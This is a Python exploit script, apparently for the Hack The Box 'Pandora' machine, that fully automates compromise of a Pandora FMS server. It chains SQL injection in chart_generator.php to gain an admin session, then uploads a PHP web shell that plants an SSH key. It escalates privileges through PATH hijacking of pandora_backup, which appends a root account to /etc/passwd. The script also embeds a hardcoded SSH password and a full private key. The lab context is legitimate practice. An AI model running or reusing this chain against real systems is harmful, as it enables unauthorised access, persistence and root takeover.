#!/usr/bin/python3
import requests as req
import paramiko
import os
import time

# Start peer
os.system('sshpass -p "HotelBabylon23" ssh daniel@pandora.htb -L 1337:127.0.0.1:80 -N&')
time.sleep(5)

# SQLi to Pandora
#http://127.0.0.1:<your_port>/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO
r=req.get('http://localhost:1337/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO')
admin_cookie=r.cookies.get('PHPSESSID')

cookies = {
    'PHPSESSID': admin_cookie,
}

headers = {
    'Host': 'localhost:1337',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------308045185511758964171231871874',
    'Content-Length': '1289',
    'Connection': 'close',
    'Referer': 'http://localhost/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
}

params = (
    ('sec', 'gsetup'),
    ('sec2', 'godmode/setup/file_manager'),
)

ssh_key_pub = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDW+tHX40B7iUqho6xolQwZ8TYjNDx6ob6+b4OUWdHcZrPv9b9f9ppc7zZkVLW94YbeJv1IKTkQIK6XxGQgMxsTXFRNH3nf53EFYhT4s367NQgxf/OB3t7BNnHVzyp0WsrZccw5eHUN6RKqs4OAoOHV+ehRQytflcoi+8zpmVNbloQnOtqccfWnL/BIX6ZD+jEWF7oTR4O3ZNa/kL8wH13F6eWouTv/quhilYOUWxoihdgNP0ctjgvc7LxtdYzRAG+LWJXLYfrIRLA1Whcg1sAEOkWDTApmN7eRjsLw/05w1iGZwH0luYkwkgWQOhcVVcjbqSfuYwCgPdY5yWvaLnBA0xJJQizozZIbjaCB2OQqHRmbG51prNaL3Jxj9wixwSFftp1xhJxfbt77ASg0teS7Cd+m6tSWpUA/p/0L6XtDHfP0sJJhUM7bIzY3PhlbXCB5cnE1KTyQBTH0I5qUze/p52ZDzPiDQ0xQMz53I1u6i4joCMChGhKofOfcjIoPO+8= root@pt-linux"
ssh_key = """-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
"""

data = f'-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="file"; filename="payload.php"\r\nContent-Type: application/x-php\r\n\r\n<?php system(\'mkdir /home/matt/.ssh; echo {ssh_key_pub} > /home/matt/.ssh/authorized_keys\');?>\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="umask"\r\n\r\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="decompress_sent"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="go"\r\n\r\nGo\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="real_directory"\r\n\r\n/var/www/pandora/pandora_console/images\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="directory"\r\n\r\nimages\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash"\r\n\r\n6427eed956c3b836eb0644629a183a9b\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash2"\r\n\r\n594175347dddf7a54cc03f6c6d0f04b4\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="upload_file_or_zip"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874--\r\n'

r=req.post('http://localhost:1337/pandora_console/index.php', headers=headers, params=params, cookies=cookies, data=data, verify=False)
if r.ok:
  print("[+] PWNED!")

# Write pub key to .ssh/authorized_keys on server
req.post("http://localhost:1337/pandora_console/images/payload.php")

# Go to ssh
w=open("key", "w")
w.write(ssh_key)
w.close()
os.system("chmod 600 ./key")
pkey = paramiko.RSAKey.from_private_key_file("key")
cli = paramiko.SSHClient()
cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
cli.connect(hostname='pandora.htb', username='matt', look_for_keys=True, allow_agent=True, pkey=pkey)
# Creds of hash: { xxx:xxx }
payload = 'echo "echo \"eHh4OiQ2JDBpcGZOazhNQkFNVHkyVjAkQkJQYXg1NUUyc0VrT01XUWl4WU5TcjBXRERLdlpweFVHeWRwTnNjWkpoMzFpRHRIbXovaS50QTU0VU1GVkh3MmhKSDdhL25vMDNzaVRxNGhJUmtrTDA6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoCg==\" | base64 -d >> /etc/passwd" > /tmp/tar; chmod +x /tmp/tar; export PATH=/tmp:$PATH; pandora_backup;rm -rf /tmp/tar'
stdin, stdout, stderr = cli.exec_command(payload)
stdout.read()
os.system("scp -i ./key ./get_flag.sh matt@pandora.htb:/tmp/.g")
print("CREDS OF USER[xxx]: { xxx:passwd }")
os.system("ssh -i ./key matt@pandora.htb su xxx -c '/tmp/.g;rm -rf /tmp/.g'")
os.remove("key")
os.system("killall sshpass")
